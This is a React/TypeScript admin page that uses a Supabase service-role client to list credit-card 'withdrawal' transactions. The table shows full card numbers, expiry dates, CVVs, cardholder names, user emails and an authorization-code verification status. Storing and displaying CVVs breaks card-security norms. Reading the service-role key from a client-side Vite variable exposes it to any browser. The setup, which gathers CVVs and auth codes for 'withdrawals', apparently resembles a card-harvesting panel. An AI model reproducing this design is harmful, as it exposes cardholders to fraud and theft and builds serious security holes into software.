import { useEffect, useState } from "react";
import { supabaseAdmin } from "@/lib/supabaseAdmin";
import { supabase } from "@/lib/supabaseClient";
import { Card, CardContent } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { StatusBadge } from "../components/StatusBadge";
import { CreditCard, User, Calendar, Shield } from "lucide-react";

export default function CardsList() {
  const [rows, setRows] = useState<any[]>([]);
  const [profileMap, setProfileMap] = useState<Record<string, any>>({});
  const [loading, setLoading] = useState(true);
  const [pageError, setPageError] = useState<string | null>(null);

  useEffect(() => {
    document.title = "Admin · Cards";

    if (!supabaseAdmin) {
      setPageError(
        "Admin client not configured — VITE_SUPABASE_URL or VITE_SUPABASE_SERVICE_ROLE_KEY is missing."
      );
      setLoading(false);
      return;
    }

    (async () => {
      try {
        const { data: cards, error: cardsError } = await supabaseAdmin
          .from("transactions")
          .select("*")
          .eq("method", "Credit Card")
          .order("created_at", { ascending: false });

        if (cardsError) {
          setPageError(`Cards query failed: ${cardsError.message}`);
          setLoading(false);
          return;
        }

        console.log("✅ Cards fetched:", cards?.length || 0);
        setRows(cards ?? []);
        setLoading(false);

        const userIds = [...new Set((cards ?? []).map((c: any) => c.user_id).filter(Boolean))];
        if (userIds.length > 0) {
          const { data: profiles, error: profilesError } = await supabase
            .from("profiles")
            .select("user_id, full_name, email")
            .in("user_id", userIds);

          if (profilesError) {
            console.error("Profile fetch failed (cards still shown):", profilesError.message);
          } else {
            const map: Record<string, any> = {};
            profiles?.forEach((p: any) => (map[p.user_id] = p));
            setProfileMap(map);
          }
        }
      } catch (err: any) {
        console.error("❌ Error:", err);
        setPageError(err.message || "Failed to load cards");
        setLoading(false);
      }
    })();
  }, []);

  const formatDate = (date: string) => {
    if (!date) return "—";
    return new Date(date).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  if (pageError) {
    return (
      <div className="p-6">
        <h2 className="text-lg font-semibold text-red-500">Error loading cards</h2>
        <pre className="mt-2 text-xs whitespace-pre-wrap text-muted-foreground bg-muted p-3 rounded">
          {pageError}
        </pre>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      <div className="flex justify-between items-center">
        <div>
          <h1 className="text-2xl font-semibold">Cards</h1>
          <p className="text-sm text-muted-foreground">
            {rows.length} cards on file · contains highly sensitive data
          </p>
        </div>
      </div>
      <Card>
        <CardContent className="p-0">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Card Number</TableHead>
                  <TableHead>Expiry</TableHead>
                  <TableHead>CVV</TableHead>
                  <TableHead>Card Holder</TableHead>
                  <TableHead>User</TableHead>
                  <TableHead>Amount</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Verified</TableHead>
                  <TableHead>Date</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {loading ? (
                  <TableRow>
                    <TableCell colSpan={9} className="text-center text-muted-foreground py-8">
                      Loading cards...
                    </TableCell>
                  </TableRow>
                ) : rows.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={9} className="text-center text-muted-foreground py-8">
                      <div className="space-y-2">
                        <CreditCard className="h-8 w-8 mx-auto text-muted-foreground/50" />
                        <p>No cards found</p>
                        <p className="text-xs text-muted-foreground/70">
                          Card transactions will appear here when users submit card withdrawal requests
                        </p>
                      </div>
                    </TableCell>
                  </TableRow>
                ) : (
                  rows.map((c) => {
                    const profile = profileMap[c.user_id] || {};
                    return (
                      <TableRow key={c.id} className="hover:bg-muted/50">
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <CreditCard className="h-4 w-4 text-muted-foreground" />
                            <span className="font-mono text-sm font-medium">
                              {c.card_number || "—"}
                            </span>
                          </div>
                        </TableCell>
                        <TableCell className="font-mono text-sm">
                          {c.card_exp || "—"}
                        </TableCell>
                        <TableCell className="font-mono text-sm">
                          {c.card_cvv || "—"}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <User className="h-3 w-3 text-muted-foreground" />
                            <span className="text-sm">{c.card_billing_name || "—"}</span>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="text-sm">
                            {profile?.full_name || profile?.email || c.user_id || "—"}
                          </div>
                          {profile?.email && (
                            <div className="text-xs text-muted-foreground truncate max-w-[150px]">
                              {profile.email}
                            </div>
                          )}
                        </TableCell>
                        <TableCell>
                          <span className="font-mono text-sm font-medium">
                            ${c.amount?.toFixed(2) || "0.00"}
                          </span>
                        </TableCell>
                        <TableCell>
                          <StatusBadge status={c.status} />
                        </TableCell>
                        <TableCell>
                          {c.auth_code_verified ? (
                            <div className="flex items-center gap-1 text-green-600">
                              <Shield className="h-3 w-3" />
                              <span className="text-xs">Verified</span>
                            </div>
                          ) : (
                            <span className="text-xs text-muted-foreground">Pending</span>
                          )}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-1">
                            <Calendar className="h-3 w-3 text-muted-foreground" />
                            <span className="text-xs text-muted-foreground whitespace-nowrap">
                              {formatDate(c.created_at)}
                            </span>
                          </div>
                        </TableCell>
                      </TableRow>
                    );
                  })
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
